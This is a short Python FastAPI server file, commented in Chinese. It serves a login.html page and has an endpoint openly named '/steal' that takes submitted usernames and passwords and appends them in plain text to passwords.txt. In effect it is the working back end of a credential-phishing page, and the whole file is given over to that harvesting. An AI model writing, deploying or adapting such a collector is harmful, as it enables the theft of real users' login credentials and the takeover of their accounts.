from fastapi import FastAPI, Request
from fastapi.responses import FileResponse
import json
from pathlib import Path

app = FastAPI()

@app.get("/")
def home():
    # 抓取目前 main.py 所在的資料夾，然後加上 login.html
    base_dir = Path(__file__).resolve().parent
    file_path = base_dir / "login.html"
    return FileResponse(file_path)

@app.post("/steal")
async def steal(request: Request):
    data = await request.json()

    username = data.get("username", "")
    password = data.get("password", "")

    with open("passwords.txt", "a", encoding="utf-8") as f:
        f.write(f"username={username}, password={password}\n")

    return {"status": "ok"}